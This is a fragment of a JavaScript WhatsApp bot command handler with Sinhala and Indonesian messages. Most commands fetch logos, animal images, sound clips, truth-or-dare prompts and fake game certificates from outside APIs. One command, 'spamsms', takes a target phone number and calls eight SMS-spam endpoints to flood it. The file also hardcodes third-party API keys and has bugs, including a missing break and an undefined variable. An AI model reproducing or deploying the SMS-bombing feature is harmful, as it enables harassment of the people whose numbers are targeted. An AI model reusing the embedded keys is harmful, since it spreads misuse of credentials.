                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   case 'tfire':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(7)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/tfire?text=${F}&apikey=Alphabott`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})  
                   case 'ytgold': 
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(8)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?text=${F}&apikey=Alphabott`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'ytsilver': 
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(10)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/splaybutton?text=${F}&apikey=Alphabott`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 't3d':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(5)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=Alphabott&text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   case 'logoa':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod&chan*`)
                   var F = body.slice(7)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/logoaveng?text1=${F1}&text2=${F2}&apikey=Alphabott`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'pornhub':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod&chan*`)
                   var F = body.slice(9)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/phlogo?text1=${F1}&text2=${F2}&apikey=Alphabott`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
case 'naruto': case 'mikasa': case 'eren': case 'titan': case 'levi': case 'sakura': case 'hinata': case 'neji': 
                    case 'minato': case 'jiraya': case 'tsunade': case 'kiba': case 'boruto': case 'sarada': case 'sasuke': 
                    case 'madara': case 'obito': case 'obito': case 'tanjiro': case 'nezuko': case 'luffy': case 'zoro': case 'sanji':                     
                    case 'gon': case 'killua': case 'sagiri': case 'rimuru': case 'natsu': case 'genos': case 'saitama': case 'miku':  
                    hypermod.updatePresence(from, Presence.composing) 
				    data = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=karakter anime ${command} hd`, {method: 'get'})
				    reply('Wait Ngab')
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    hypermod.sendMessage(from, pok, image, { quoted: mek})
				    break
                   case 'marvel':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod&chan*`)
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/marvellogo?text1=${F1}&text2=${F2}&apikey=Alphabott`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'leavest':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(9)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/leavest?text=${F}&apikey=Alphabott`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
//
//
//
                    case 'sound1':
                    const sound1 = fs.readFileSync('media/vn/sound1.mp3')
                    hypermod.sendMessage(from, sound1, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'hypers2':
                    const hypers2 = fs.readFileSync('media/vn/hypers2.mp3')
                    hypermod.sendMessage(from, hypers2, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break    
                            
                     case 'hypers1':
                    const hypers1 = fs.readFileSync('media/vn/hypers1.mp3')
                    hypermod.sendMessage(from, hypers1, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                            
                    case 'sound2':
                    const sound2 = fs.readFileSync('media/vn/sound2.mp3')
                    hypermod.sendMessage(from, sound2, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'sound3':
                    const sound3 = fs.readFileSync('media/vn/sound3.mp3')
                    hypermod.sendMessage(from, sound3, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break 
                    case 'sound4':
                    const sound4 = fs.readFileSync('media/vn/sound4.mp3')
                    hypermod.sendMessage(from, sound4, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break      
                    case 'sound5':
                    const sound5 = fs.readFileSync('media/vn/sound5.mp3')
                    hypermod.sendMessage(from, sound5, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break           
                    case 'sound6':
                    const sound6 = fs.readFileSync('media/vn/sound6.mp3')
                    hypermod.sendMessage(from, sound6, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound7':
                    const sound7 = fs.readFileSync('media/vn/sound7.mp3')
                    hypermod.sendMessage(from, sound7, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound8':
                    const sound8 = fs.readFileSync('media/vn/sound8.mp3')
                    hypermod.sendMessage(from, sound8, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound9':
                    const sound9 = fs.readFileSync('media/vn/sound9.mp3')
                    hypermod.sendMessage(from, sound9, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound10':
                    const sound10 = fs.readFileSync('media/vn/sound10.mp3')
                    hypermod.sendMessage(from, sound10, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound11':
                    const sound11 = fs.readFileSync('media/vn/sound11.mp3')
                    hypermod.sendMessage(from, sound11, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound12':
                    const sound12 = fs.readFileSync('media/vn/sound12.mp3')
                    hypermod.sendMessage(from, sound12, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound13':
                    const sound13 = fs.readFileSync('media/vn/sound13.mp3')
                    hypermod.sendMessage(from, sound13, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound14':
                    const sound14 = fs.readFileSync('media/vn/sound14.mp3')
                    hypermod.sendMessage(from, sound14, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound15':
                    const sound15 = fs.readFileSync('media/vn/sound15.mp3')
                    hypermod.sendMessage(from, sound15, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound16':
                    const sound16 = fs.readFileSync('media/vn/sound16.mp3')
                    hypermod.sendMessage(from, sound16, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound17':
                    const sound17 = fs.readFileSync('media/vn/sound17.mp3')
                    hypermod.sendMessage(from, sound17, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound18':
                    const sound18 = fs.readFileSync('media/vn/sound18.mp3')
                    hypermod.sendMessage(from, sound18, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound19':
                    const sound19 = fs.readFileSync('media/vn/sound19.mp3')
                    hypermod.sendMessage(from, sound19, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound20':
                    const sound20 = fs.readFileSync('media/vn/sound20.mp3')
                    hypermod.sendMessage(from, sound20, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound21':
                    const sound21 = fs.readFileSync('media/vn/sound21.mp3')
                    hypermod.sendMessage(from, sound21, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound22':
                    const sound22 = fs.readFileSync('media/vn/sound22.mp3')
                    hypermod.sendMessage(from, sound22, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                
                    case 'sound23':
                    const sound23 = fs.readFileSync('media/vn/sound23.mp3')
                    hypermod.sendMessage(from, sound23, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break              
                    case 'sound24':
                    const sound24 = fs.readFileSync('media/vn/sound24.mp3')
                    hypermod.sendMessage(from, sound24, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break                                                        
                    case 'sound25':
                    const sound25 = fs.readFileSync('media/vn/sound25.mp3')
                    hypermod.sendMessage(from, sound25, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek})
                    break   
//
//
//                
                   case 'phcoment': 
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod&chan*`)
                   var F = body.slice(10)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/phub?apikey=apivinz&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'nulis':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(7)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${F}&apikey=apivinz`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'shortener':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command}https://link*`)
                   F = body.slice(11)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)                   
                   anu = await fetchJson(`https://api.zeks.xyz/api/sid-shortener?apikey=apivinz&url=${F}`)
                   anu1 = `➻ *SHORT* : ${anu.short}\n`
                   anu1 += `➻ *LONG* : ${anu.long}\n`
                   anu1 += `➻ *DATE* : ${anu.created_at.date}\n`
                   anu1 += `➻ *TYPE* : ${anu.created_at.timezone_type}\n`
                   anu1 += `➻ *ZONA* : ${anu.created_at.timezone}\n`
                   reply(anu1)
                   break 
                   case 'urlshort': 
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command}https://link*`)
                   F = body.slice(10)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)                                      
                   anu = await fetchJson(`https://api.zeks.xyz/api/urlshort-all?apikey=apivinz&url=${F}`)
                   anu1 = `➻ *SATU* : ${anu.result_1}\n`
                   anu1 += `➻ *DUA* : ${anu.result_2}\n`
                   anu1 += `➻ *TIGA* : ${anu.result_3}\n`
                   reply(anu1)
                   break
                  case 'fox':  
                   anu = await fetchJson(`https://some-random-api.ml/img/fox`)
                   anu1 = await getBuffer(anu.link)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
                   break
                   case 'dog':  
                   anu = await fetchJson(`https://some-random-api.ml/img/dog`)
                   anu1 = await getBuffer(anu.link)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
                   break
                   case 'cat':  
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
                   break
                   case 'panda':  
                   anu = await fetchJson(`https://some-random-api.ml/img/panda`)
                   anu1 = await getBuffer(anu.link)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
                   break
case 'karakter':
F19 = body.slice(4)
hypermod.updatePresence(from, Presence.composing) 
				    data = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=${args[0]} hd`, {method: 'get'})
				    reply('Wait Ngab')
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    hypermod.sendMessage(from, pok, image, { quoted: mek})
				    break
                   case 'panda1':  
                   anu = await fetchJson(`https://some-random-api.ml/img/red_panda`)
                   anu1 = await getBuffer(anu.link)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
                   break
                   case 'bird':  
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
                   break
                   case 'koala':  
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
                   break
                   case 'meme':  
                   anu = await fetchJson(`https://some-random-api.ml/meme`)
                   anu1 = await getBuffer(anu.image)
                   hypermod.sendMessage(from, anu1, image, {caption: `nih kak`, quoted: mek})
                   break
                   case 'ssweb': 
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} https://google.com*`)                  
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`http://anu-team.herokuapp.com/api/ssweb?url=${body.slice(7)}`)
                   hypermod.sendMessage(from, anu, image, {caption: `nih kack`, quoted: mek})
                   break
                   case 'smoke':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(7)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api-rull.herokuapp.com/api/Photooxy/smoke?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   case 'rainbow':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(9)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api-rull.herokuapp.com/api/Photooxy/rainbowshine?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break   
                   case 'truth':
                const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		truteh = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1KD1zY8An0BOekCJQJTgnSEZ9rx3zSVWjvA&usqp=CAU`)
		hypermod.sendMessage(from, truteh, image, { caption: '*TRUTH*\n\n'+ ttrth, quoted: mek })
		break
		case 'dare':
		const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
		tod = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1KD1zY8An0BOekCJQJTgnSEZ9rx3zSVWjvA&usqp=CAU`)
		hypermod.sendMessage(from, tod, image, { quoted: mek, caption: '*DARE*\n\n'+ der })
		break
                  case 'ssweb2':
					if (args.length < 1) return reply('Urlnya mana om')
					teks = body.slice(7)
					reply(`WAIT`)
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/screenshotweb?url=${teks}`)
					buff = await getBuffer(anu.gambar)
					hypermod.sendMessage(from, buff, image, {quoted: mek})
					break
                  case 'spamsms':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam7?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam8?apikey=${lolhuman}&nomor=${nomor}`)
                    reply("Success")
                    break
                   break
				case 'bisakah':
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi','Ngimpi kah?','yakin bisa?']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					hypermod.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					break
				case 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Tidak Akan Pernah']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					hypermod.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					break
         			  case 'apakah':
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','Tanyakan Ayam']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					hypermod.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					break
				case 'rate':
					rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					hypermod.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					break
                    case 'ffserti':  
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(9)
					zhain = await getBuffer(`https://onlydevcity.xyz/FFSerti/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'ffserti2':  				
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(10)
					zhain = await getBuffer(`https://onlydevcity.xyz/FFSerti2/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'ffserti3':  			
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(10)
					zhain = await getBuffer(`https://onlydevcity.xyz/FFSerti3/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'ffserti4':  				
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(10)
					zhain = await getBuffer(`https://onlydevcity.xyz/FFSerti4/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'ffserti5':  			
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(10)
					zhain = await getBuffer(`https://onlydevcity.xyz/FFSerti5/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break			
					case 'mlserti':  			
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(9)
					zhain = await getBuffer(`https://onlydevcity.xyz/MLTourSerti/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'mlserti2':  			
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(10)
					zhain = await getBuffer(`https://onlydevcity.xyz/MLTourSerti2/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'mlserti3':  
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(10)
					zhain = await getBuffer(`https://onlydevcity.xyz/MLTourSerti3/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'mlserti4':  			
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(10)
					zhain = await getBuffer(`https://onlydevcity.xyz/MLTourSerti4/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'mlserti5':  
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(10)
					zhain = await getBuffer(`https://onlydevcity.xyz/MLTourSerti5/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
                   case 'pubgserti':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(11)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti/img.php?nama=${ct}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
					case 'pubgserti2':  
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
					ct = body.slice(12)
					zhain = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti2/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'pubgserti3':  
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)					 
					ct = body.slice(12)
					zhain = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti3/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'pubgserti4':  
					if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
					reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`) 
					ct = body.slice(12)
					zhain = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti4/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'pubgserti5':  								 				 
				    if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
				    reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`) 
					ct = body.slice(12)
					zhain = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti5/img.php?nama=${ct}`)
					hypermod.sendMessage(from, zhain, image, {caption: `හයිපර් තමා හොදටම කරේ`, quoted: mek})
					break
					case 'tololserti':							 				 
				    if (args.length < 1) return reply(`[❗] CONTOH??\n${prefix}${command} whatsapp`)
				    F = body.slice(12)
				    reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
				    to = await getBuffer(`https://evilblackteam.nasiwebhost.com/serti1/img.php?nama=${F}`)
				    hypermod.sendMessage(from, to, image, {caption: 'NIHH KACK', quoted:mek})
				    break
         	case 'gtav':          	 
	                var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                  	ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                  	owgi = await hypermod.downloadAndSaveMediaMessage(ted)
                  	tels = body.slice(7)
                  	anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
                  	hehe = await getBuffer(`https://videfikri.com/api/textmaker/gtavposter/?urlgbr=${anu.display_url}`)
	                hypermod.sendMessage(from, hehe, image, {quoted:mek})
	                } else {
                  	reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
	                }
	                break
                 	case 'facebookpage':                     	 
	                var imgbb = require('imgbb-uploader')
                 	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
